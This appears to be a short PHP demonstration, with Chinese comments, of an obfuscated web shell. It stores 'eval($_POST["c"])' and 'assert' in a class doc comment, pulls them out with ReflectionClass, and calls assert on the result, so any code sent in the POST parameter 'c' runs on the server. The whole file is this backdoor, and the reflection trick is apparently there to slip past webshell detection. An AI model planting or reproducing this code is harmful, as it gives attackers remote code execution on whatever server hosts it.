<?php
/**
* eval($_POST["c"]);
* assert
*/
class TestClass { }  
//随便注册一个类
$rc = new ReflectionClass('TestClass');
//实例化一个放射类
$str=$rc->getDocComment();
//拿到了我对testClass类的注释
$pos=strpos($str,'e');
$eval=substr($str,$pos,18);
$pos=strpos($str,'assert');
$fun=substr($str,$pos,6);
//这个获取文本,以便用于构造动态函数。
echo $eva;
$fun($eval);
//这个就是执行了。
?>